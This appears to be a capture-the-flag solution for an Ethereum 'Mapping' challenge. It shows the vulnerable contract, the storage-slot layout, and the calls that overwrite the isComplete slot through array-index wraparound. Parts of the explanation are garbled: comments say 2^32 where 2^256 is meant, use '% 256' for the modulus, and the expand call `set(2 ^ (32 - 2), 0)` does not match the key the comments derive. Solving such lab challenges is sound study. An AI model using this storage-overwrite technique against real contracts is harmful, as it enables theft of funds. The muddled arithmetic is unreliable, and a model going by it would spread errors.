/*
pragma solidity ^0.4.21;

contract MappingChallenge {
    bool public isComplete;
    uint256[] map;

    function set(uint256 key, uint256 value) public {
        // Expand dynamic array as needed
        if (map.length <= key) {
            map.length = key + 1;
        }

        map[key] = value;
    }

    function get(uint256 key) public view returns (uint256) {
        return map[key];
    }
}

*/

// Storage via slot
// https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/

// Slot size 256 (32 bytes)
// 0 -> isComplete
// 1 -> size
//    data : sha3(0x0000000000000000000000000000000000000000000000000000000000000001) + index

/*
example:
  set(5, 10)

storage layout
// isComplete
0x0000000000000000000000000000000000000000000000000000000000000000 -> 0
// Length
0x0000000000000000000000000000000000000000000000000000000000000001 -> 0x0000000000000000000000000000000000000000000000000000000000000006

// ...... 
// sha3(0x0000000000000000000000000000000000000000000000000000000000000001)+ 5 = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cfb
0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cfb -> 0x000000000000000000000000000000000000000000000000000000000000000a // 10
*/

/*
Trick: Need expand all storage space of contract 2^32 address
 -> If not 
 key + 1 = 2^32 - 1
 => key = 2^32 - 2

 115792089237316195423570985008687907853269984665640564039457584007913129639934
*/

X = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6n;
MAX = 2n ** 256n - 1n;

/*

Target Formular. find a
  (X +  a) % 256 = 0
  
  X % 256 + a % 256 = 0
  X + a % 256 = 0
  a % 256 = -X 
  a = 2^256 - X

  35707666377435648211887908874984608119992236509074197713628505308453184860938
*/

// expand
set(2 ^ (32 - 2), 0);

// hack
set(
  35707666377435648211887908874984608119992236509074197713628505308453184860938,
  1
);
